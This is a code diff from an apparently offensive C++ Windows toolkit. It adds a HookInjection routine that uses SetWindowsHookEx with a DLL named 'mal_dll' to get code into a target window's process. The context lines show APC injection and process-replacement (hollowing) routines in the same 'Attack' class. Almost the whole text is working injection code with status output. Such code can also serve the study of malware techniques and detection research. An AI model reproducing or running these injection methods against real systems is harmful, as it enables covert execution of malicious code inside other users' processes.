@@ -207,6 +207,64 @@ BOOL FindProcess(string exeName, DWORD& pid, vector<DWORD>& tids)
 	return pid > 0 && !tids.empty();
 }
 
+// Inject a DLL into target by hooking one of the targets function
+BOOL Attack::HookInjection()
+{
+	const wchar_t *dll_name = L"..\\..\\dll\\mal_dll\\Release\\mal_dll.dll";
+
+	// Finding target window
+	HWND hwnd = FindWindow(NULL, L"Radio menu item");
+	if (hwnd == NULL) 
+	{
+		cout << "[-] Could not find target window." << endl;
+		return FALSE;
+	}
+
+	// Getting the thread of the window and the PID
+	DWORD pid = NULL;
+	DWORD tid = GetWindowThreadProcessId(hwnd, &pid);
+	if (tid == NULL) 
+	{
+		cout << "[-] Could not get thread ID of the target window." << endl;
+		return FALSE;
+	}
+
+	std::cout << "[ ] Loading module in local process" << std::endl;
+	HMODULE hdll = LoadLibraryEx(dll_name, NULL, DONT_RESOLVE_DLL_REFERENCES); // Load without executing
+	if (hdll == NULL)
+	{
+		std::cout << "[-] Failed to load dll" << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Loaded DLL" << std::endl;
+
+	typedef LRESULT(WINAPI * NextHook)(int code, WPARAM wParam, LPARAM lParam); // exported from mal_dll
+	HOOKPROC addr = NextHook(GetProcAddress(hdll, "NextHook"));
+	if (addr == NULL)
+	{
+		std::cout << "[-] Failed to get proc address" << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Received Hook Address -> " << addr << std::endl;
+
+	std::cout << "[ ] Creating process hook" << std::endl;
+	HHOOK hProc = SetWindowsHookEx(WH_GETMESSAGE,
+		addr,
+		hdll,
+		tid
+	);
+
+	if (hProc == NULL)
+	{
+		std::cout << "[-] Failed to hook process" << std::endl;
+		return FALSE;
+	}
+	std::cout << "[+] Hook injected" << std::endl;
+	UnhookWindowsHookEx(hProc);
+
+	return TRUE;
+}
+
 // Inject a DLL into a target without creating a remote process or thread, actually uses
 // virtual memory
 BOOL Attack::APCinjection(string target, TCHAR *dll_name)
@@ -352,7 +410,7 @@ BOOL ProcessReplacement(string inj_exe)
 	if (!get<0>(bin))
 	{
 		std::cout << "[-] Error opening file" << std::endl;
-		return EXIT_FAILURE;
+		return FALSE;
 	}
 
 	char *PE_FILE = get<1>(bin); // get pointer to binary as char array
